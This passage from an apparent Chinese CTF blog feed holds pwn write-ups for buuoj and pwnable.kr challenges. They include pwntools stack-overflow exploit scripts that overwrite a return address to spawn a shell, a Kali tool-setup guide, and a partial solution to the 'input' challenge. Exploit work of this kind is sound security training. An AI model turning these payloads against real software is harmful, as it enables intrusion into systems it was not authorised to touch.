class="number">4</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + p64(sys_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>((sh.recvline()).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./warmup_csaw_2016&#x27;</span>: pid 2875</span><br><span class="line">flag&#123;Th1s_is_A_tEst_f1a9&#125;</span><br><span class="line"></span><br><span class="line">[*] Stopped process <span class="string">&#x27;./warmup_csaw_2016&#x27;</span> (pid 2875)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>rip1</title>
    <link href="https://www.ruomo.fun/2021/06/17/buuoj/rip1/"/>
    <id>https://www.ruomo.fun/2021/06/17/buuoj/rip1/</id>
    <published>2021-06-17T02:22:07.616Z</published>
    <updated>2021-06-18T06:04:12.707Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=pwn1</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   64) Symbols       No    0               1               pwn1</span><br></pre></td></tr></table></figure><p>拖入ida64分析，<code>main</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于读入字符串用的是gets，因此存在栈溢出漏洞。</p><p>Shift + F12发现字符串**/bin/sh**，是在函数<code>fun</code>中，该函数地址为<code>0x401186</code>。</p><p>计算变量s到返回地址的距离是0x17，使用字符串填充然后用函数<code>fun</code>的地址覆盖返回地址。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">elf = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">26057</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(elf)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x17</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 base.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn1&#x27;</span>: pid 2144</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaa\x86\x11</span><br><span class="line">ok,<span class="built_in">bye</span>!!!</span><br><span class="line">$ ls</span><br><span class="line">base.py  core  pwn1</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境配置（kali虚拟机）</title>
    <link href="https://www.ruomo.fun/2021/06/13/others/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(kali%E8%99%9A%E6%8B%9F%E6%9C%BA)/"/>
    <id>https://www.ruomo.fun/2021/06/13/others/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(kali%E8%99%9A%E6%8B%9F%E6%9C%BA)/</id>
    <published>2021-06-13T08:33:20.949Z</published>
    <updated>2021-06-18T04:13:41.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kali初始配置">kali初始配置</h2><h3 id="获取kali">获取kali</h3><blockquote><p>文档撰写时kali版本为：2021.2</p></blockquote><ol><li>从kali官网获取kali（<a href="https://www.kali.org/get-kali/">Get Kali</a>），选择<strong>Virtual Machines</strong>，我这用的vmware，所以下vmware的</li><li>将下载来的7z解压出来，然后使用vmware打开</li><li>开机，默认账号密码为：<code>kali/kali</code></li></ol><h3 id="中文切换">中文切换</h3><ol><li><code>Ctrl + Alt + T</code>打开terminal，输入<code>sudo dpkg-reconfigure locales</code></li><li>选中<code>en_US.UTF-8</code>、<code>zh_CN.GBK</code>和<code>zh_CN.UTF-8</code>（基本操作：上下键切换，空格键选中，也可用PageDown和PageUp键快速翻页），回车进入下一步</li><li>选择<code>zh_CN.UTF-8</code>，回车完成配置</li><li>执行命令<code>sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</code>安装字体</li><li>执行命令<code>sudo reboot</code>重启虚拟机完成初始配置</li></ol><h2 id="pwn环境安装">pwn环境安装</h2><blockquote><p>默认环境：python2.7.18、python3.9.2，无pip</p></blockquote><h3 id="pwntools安装">pwntools安装</h3><ol><li>执行命令<code>sudo apt install python3-pip</code>安装pip</li><li>执行命令<code>pip install pwntools</code>安装pwntools</li><li>在python3中测试pwntools是否安装成功，测试结果如下</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ python3</span><br><span class="line">Python 3.9.2 (default, Feb 28 2021, 17:03:44) </span><br><span class="line">[GCC 10.2.1 20210110] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; asm(<span class="string">&#x27;xor eax,eax&#x27;</span>)</span><br><span class="line">b<span class="string">&#x27;1\xc0&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="pwndbg安装">pwndbg安装</h3><blockquote><p>kali 2021.2默认无gdb</p></blockquote><ol><li>输入命令<code>sudo apt install gdb</code>安装gdb</li><li>输入命令<code>git clone https://github.com/pwndbg/pwndbg</code>从仓库中将pwndbg clone至本机</li><li>执行以下命令安装pwndbg</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><ol start="4"><li>输入<code>gdb</code>测试，测试结果如下：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/pwndbg]</span><br><span class="line">└─$ gdb</span><br><span class="line">GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.                                                    </span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>.</span><br><span class="line">pwndbg: loaded 189 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><blockquote><p>ps: 注意不能删除clone下来的pwndbg目录，不然就会回到普通的gdb</p></blockquote><h3 id="LibcSearcher安装">LibcSearcher安装</h3><p>依次运行以下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">sudo python setup.py develop</span><br></pre></td></tr></table></figure><h3 id="ROPgadget安装">ROPgadget安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p>安装完后调用ROPgadget命令可能会会报如下错误类似这样的错误<code>pkg_resources.ResolutionError: Script 'scripts/ROPgadget' not found in metadata at '一个目录'</code></p><p>这个时候在clone下来的ROPgadget目录下输入命令<code>sudo cp -r scripts 目录</code>，后面的目录就是上面报错的目录。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;kali初始配置&quot;&gt;kali初始配置&lt;/h2&gt;
&lt;h3 id=&quot;获取kali&quot;&gt;获取kali&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;文档撰写时kali版本为：2021.2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;从kali官网获取kali（&lt;a </summary>
      
    
    
    
    <category term="others" scheme="https://www.ruomo.fun/categories/others/"/>
    
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
    <category term="kali" scheme="https://www.ruomo.fun/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>input</title>
    <link href="https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/input/"/>
    <id>https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/input/</id>
    <published>2021-06-04T07:27:47.951Z</published>
    <updated>2021-06-04T09:45:00.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原题内容">原题内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目附件：<a href="/files/pwnable/toddlers_bottle/input">点我下载</a></p><h2 id="程序源码">程序源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目分析">题目分析</h2><p>获取flag需要过5关，类似拆炸弹游戏，需要5步才能拆除炸弹。</p><h3 id="Stage-1">Stage 1</h3><p>第1步要求如下：</p><ol><li>传入长度为100个字符。</li><li>字符&quot;A&quot;所代表ascii值位置的字符为<code>\x00</code>，字符&quot;B&quot;所代表位置的字符为<code>\x20\x0a\x0d</code></li></ol><p>这步比较简单，直接构造就行，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">argv = [<span class="string">&#x27;a&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>():</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    argv[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Stage-2">Stage 2</h3><p>第2步要求如下：</p><ol><li>stdin的内容为<code>\x00\x0a\x00\xff</code></li><li>stderr的内容为<code>\x00\x0a\x02\xff</code></li></ol><p>若直接在process中添加<code>stdin = '\x00\x0a\x00\xff'和stderr = '\x00\x0a\x02\xff'</code>会产生报错，因为这里需要使用管道（pipe）。</p><p>创建管道的方法为：<code>r, w = os.pipe()</code>。</p><p>然后在管道中写入我们的数据即可。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r_in, w_in = os.pipe()</span><br><span class="line">r_err, w_err = os.pipe()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>():</span></span><br><span class="line">    os.write(w_in, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">    os.write(w_err, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Stage-3">Stage 3</h3><p>第3步是获取环境变量<code>\xde\xad\xbe\xef</code>的值，如果它等于<code>\xca\xfe\xba\xbe</code>则通过。</p><p>环境变量是一个字典，因此可以构造一个字典传入。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env = &#123;&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage3</span>():</span></span><br><span class="line">    env[<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>] = <span class="string">b&#x27;\xca\xfe\xba\xbe&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Stage-4">Stage 4</h3><p>第4步是从当前目录读入一个文件名是<code>\x0a</code>的文件，读4个字符判断是否为<code>\x00\x00\x00\x00</code>，那么直接创建文件写入即可。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage4</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Stage-5">Stage 5</h3><p>第5步是监听本机的端口，端口号是<code>argv</code>中字符&quot;C&quot;的ascii码位置所在的文本。若收到字符串<code>\xde\xad\xbe\xef</code>则通过。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, time</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage5</span>():</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">13145</span>))</span><br><span class="line">    s.send(<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>最终脚本源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, socket, time</span><br><span class="line"></span><br><span class="line">argv = [<span class="string">&#x27;a&#x27;</span> <span 